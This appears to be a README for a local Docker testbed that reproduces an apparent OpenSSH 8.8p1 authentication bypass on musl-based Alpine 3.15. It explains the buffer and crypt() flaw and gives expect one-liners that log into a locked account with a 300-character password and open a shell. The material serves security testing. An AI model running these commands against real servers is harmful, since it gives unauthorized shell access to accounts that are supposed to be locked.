# `*sshole` (OpenSSH < 10.6p2 + `musl` libc) Local Testbed

> **WARNING**: For local security testing only. Keep the container port bound
> strictly to `127.0.0.1:2222` (never `0.0.0.0`).

## Why `alpine:3.15` (`OpenSSH_8.8p1`)?

On **2026-11-05 06:53 UTC**, Alpine Linux backported a fix
(`strlen(pw_password) > 3` in `sys_auth_passwd()`) to all supported branches
(`v3.16` `9.0_p1-r6` through `v3.20` `9.7_p1-r6`). We therefore use EOL
`alpine:3.15` (`openssh-server 8.8_p1-r1`) for an unpatched binary.

## How the Vulnerability Works in `OpenSSH_8.8p1` vs `OpenSSH_9.7p1`

1.  **`donoruser`** has a SHA-512 (`$6$`) password hash in `/etc/shadow`.
2.  **`targetuser`** is locked with `*` in `/etc/shadow`
    (`usermod -p '*' targetuser`).
3.  On **`OpenSSH_8.8p1` (`alpine:3.15`)**, `shadow_pw()` returns the raw
    pointer `spw->sp_pwdp` into `musl`'s single static `getspnam()` buffer
    (unlike `9.7p1`, which calls `xstrdup()`):
    -   **Prompt #1 (same SSH session):** `pick_salt()` harvests `donoruser`'s
        `$6$` salt into `static char salt[32]` inside the `sshd` monitor
        process, and `explicit_bzero()` wipes `musl`'s static `getspnam()`
        buffer (`pw_password` becomes `""`), so Prompt #1 fails
        (`Failed password`).
    -   **Prompt #2 (same SSH session):** `pick_salt()` sees `salt[0] != '\0'`
        and returns `salt` immediately without calling `getspnam()` or
        `explicit_bzero()`. `pw_password` remains `"*"`, `musl`'s `crypt()`
        rejects the 300-byte password (`strlen(pass) > 256`) and returns `"*"`,
        and `strcmp("*", "*") == 0` succeeds (`Accepted password`)!

> **Note:** Some system-wide `/etc/ssh/ssh_config` configurations set
> `NumberOfPasswordPrompts 1` by default, so pass
> `-o NumberOfPasswordPrompts=2 -o PubkeyAuthentication=no` to ensure the client
> prompts a second time within the same SSH session.

## Building and Starting the Container

From the directory containing [Dockerfile](Dockerfile) and
[docker-compose.yml](docker-compose.yml):

### Option 1: Using `docker build` and `docker run`

```bash
docker build --tag sshhole-testbed:latest .
docker run \
    --detach \
    --name sshhole-testbed \
    --publish 127.0.0.1:2222:22 \
    sshhole-testbed:latest
```

### Option 2: Using `docker compose`

```bash
docker compose up --detach --build
```

Verify the container is listening on `127.0.0.1:2222`:

```bash
docker ps --filter name=sshhole-testbed
```

## Reproduction

### Bash One-Liner (Interactive Shell via Tcl `string repeat`)

```bash
expect -c 'spawn ssh -o NumberOfPasswordPrompts=2 -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 targetuser@127.0.0.1; expect "password:"; send "[string repeat A 300]\r"; expect "password:"; send "[string repeat A 300]\r"; interact'
```

### Bash One-Liner (Interactive Shell via Bash `printf`)

```bash
PASS=$(printf 'A%.0s' {1..300}); expect -c "spawn ssh -o NumberOfPasswordPrompts=2 -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 targetuser@127.0.0.1; expect password:; send \"$PASS\r\"; expect password:; send \"$PASS\r\"; interact"
```

### Bash One-Liner (Run Command & Exit)

```bash
expect -c 'spawn ssh -o NumberOfPasswordPrompts=2 -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 targetuser@127.0.0.1 "id; whoami"; expect "password:"; send "[string repeat A 300]\r"; expect "password:"; send "[string repeat A 300]\r"; expect eof'
```

## Cleanup

```bash
docker rm --force sshhole-testbed
```
